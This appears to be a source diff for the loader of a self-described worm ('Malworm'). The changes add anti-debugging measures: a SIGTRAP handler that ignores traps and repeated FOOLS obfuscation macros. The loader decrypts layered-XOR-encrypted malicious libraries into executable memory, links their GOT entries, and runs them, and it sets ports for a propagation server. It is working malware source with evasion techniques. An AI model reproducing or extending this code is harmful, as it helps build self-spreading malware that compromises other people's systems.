@@ -16,10 +16,15 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <pthread.h>
+#include <signal.h>
 
 #include "main/utils.h"
 #include "main/globals.h"
 
+
+void trap_handler(int signo, siginfo_t *info, void *context){
+    return;
+}
 
 // xor a memory region with the given key and layer (layered xor-encryption logic)
 void xor_memory_layered(void * memory, size_t len, char*key, int layer);
@@ -33,11 +38,17 @@ void setup_library(MaLib **libp){
     <lib_setup>
 }
 
+int sleep_ms(unsigned int ms){
+    return usleep(ms * 1000);
+}
 
 /// initialize pointers to the functions listed in struct globals (globals.h)
 void init_globals(Globals *global){
+    FOOLS;
     global->exit=&exit;
     global->sleep=&sleep;
+    global->usleep=&usleep;
+    global->sleep_ms=&sleep_ms;
 
     // strings
     global->getcwd=&getcwd;
@@ -51,6 +62,7 @@ void init_globals(Globals *global){
     global->strncpy=&strncpy;
     global->sscanf=&sscanf;
 
+    FOOLS;
     // memory
     global->memcpy = &memcpy;
     global->memset=&memset;
@@ -66,6 +78,7 @@ void init_globals(Globals *global){
     global->write=&write;
     global->close=&close;
 
+    FOOLS;
     // heap
     global->malloc=&malloc;
     global->free=&free;
@@ -78,6 +91,7 @@ void init_globals(Globals *global){
     global->inet_ntoa=&inet_ntoa;
     global->inet_ntop=&inet_ntop;
 
+    FOOLS;
     global->socket=&socket;
     global->setsockopt=&setsockopt;
     global->bind=&bind;
@@ -87,6 +101,7 @@ void init_globals(Globals *global){
     global->freeifaddrs=&freeifaddrs;
     global->getsockname=&getsockname;
 
+    FOOLS;
     global->recv=&recv;
     global->send=&send;
     global->recvfrom=&recvfrom;
@@ -95,6 +110,7 @@ void init_globals(Globals *global){
     global->poll=&poll;
     global->ioctl=&ioctl;
     
+    FOOLS;
     // threads
     global->pthread_create=&pthread_create;
     global->pthread_detach=&pthread_detach;
@@ -107,11 +123,13 @@ void init_globals(Globals *global){
     // misc
     global->rand = &rand;
 
+    FOOLS;
     // custom functions
     global->xor_memory_layered=&xor_memory_layered;
     global->encrypt_layered=&encrypt_layered;
     global->decrypt_layered=&decrypt_layered;
 
+    FOOLS;
     // global values
     global->propagation_server_port = 42024;
     global->ipp_server_port = 6969;
@@ -120,12 +138,14 @@ void init_globals(Globals *global){
 /// execute the code from a malicious library
 void exec_malib(Globals *global, void*mem, uint64_t entry_offset, size_t mem_size){
     MaLibEntry lib_entry = (MaLibEntry)mem + entry_offset;
+    FOOLS;
     lib_entry(global);
     munmap(mem, mem_size);
 }
 
 /// load a malicious library into memory and decrypt it
 void * load_library(MaLib *lib){
+    FOOLS;
     // Allocate memory for the executable code
     void *lib_mem = mmap(NULL, lib->data_length, PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -134,13 +154,14 @@ void * load_library(MaLib *lib){
         exit(-1);
     }
 
+    FOOLS;
     // Copy the byte array to the executable memory
     memcpy(lib_mem, lib->data, lib->data_length);
-    //xor_memory(lib_mem, lib->data_length, (char *)&lib->key);
     decrypt_layered(lib_mem, lib->data_length, (char *)&lib->key);
 
     // linking GOT
     for(size_t i = 0; i < lib->n_got_mappings; i++){
+        FOOLS;
         *(uint64_t *)(lib_mem + lib->got_offsets[i]) = (uint64_t) lib_mem + lib->got_targets[i];
     }
 
@@ -151,7 +172,7 @@ void * load_library(MaLib *lib){
 void load_libraries(Globals *global){
     MaLib *lib = malloc(sizeof(MaLib));
 
-    // TODO: error handling
+    FOOLS;
     setup_library(&lib);
 
     DEBUG_LOG("🔑🔒🔑🔒🔑    0x%lx     🔑🔒🔑🔒🔑\n", lib->key);
@@ -163,6 +184,7 @@ void load_libraries(Globals *global){
     
     // run the library code (entry)
     DEBUG_LOG("🦠🪱🐛🪱🐉 Malworm ready to eat you! 🐉🪱🐛🪱🦠\n");
+    FOOLS;
     exec_malib(global, lib_mem, lib->entry_offset, lib->data_length);
 
     // free the library
@@ -171,6 +193,7 @@ void load_libraries(Globals *global){
 
 // Get filepath of executable itself
 char* load_filepath(Globals *global, char*filename){
+    FOOLS;
     global->malware_path = global->malloc(MAX_PATH_LEN);
     ASSERT(global->malware_path, "malloc");
     if(filename[0] == '/'){
@@ -187,18 +210,20 @@ char* load_filepath(Globals *global, char*filename){
 }
 // xor a memory region with the given key and layer (layered xor-encryption logic)
 void xor_memory_layered(void * memory, size_t len, char*key, int layer){
-    unsigned char* tmp = (unsigned char*) memory;
+    unsigned char* mem = (unsigned char*) memory;
     size_t keylen = KEYLEN*sizeof(char);
     int ik = 0;
     for(int i=layer; i<len; i+=layer+1){
+        FOOLS;
         char k = (char)key[ik%keylen];
-        tmp[i] ^= k;
+        mem[i] ^= k;
         ik+=layer+1;
     }
 }
 void encrypt_layered(void *memory, size_t len, char* key){
     size_t keylen = KEYLEN*sizeof(char);
     for(int i=0; i<keylen; i++){
+        FOOLS;
         xor_memory_layered(memory, len, key, i);
     }
 }
@@ -206,19 +231,37 @@ void encrypt_layered(void *memory, size_t len, char* key){
 void decrypt_layered(void *memory, size_t len, char* key){
     size_t keylen = KEYLEN*sizeof(char);
     for(int i=keylen-1; i>=0; i--){
+        FOOLS;
         xor_memory_layered(memory, len, key, i);
     }
 }
 
+void setup_trap_handler(){
+    struct sigaction trapSa;
+
+    // setup trap signal handler
+    trapSa.sa_flags = SA_SIGINFO;
+    trapSa.sa_sigaction = trap_handler;
+    int ret = sigaction(SIGTRAP, &trapSa, NULL);
+    ASSERT(ret == 0, "setup trap handler");
+}
+
 int main(int argc, char**argv) {
+    FOOLS;
+    if(!DEBUG){
+        setup_trap_handler();
+    }
+    
     // setup global variables and functions
     Globals *global = (Globals *) malloc(sizeof(Globals));
     srand(time(NULL));
     init_globals(global);
 
+    FOOLS;
     // load the filepath of the executing binary
     load_filepath(global, argv[0]);
 
+    FOOLS;
     // load and execute all provided malware-libraries
     load_libraries(global);
     return 0;
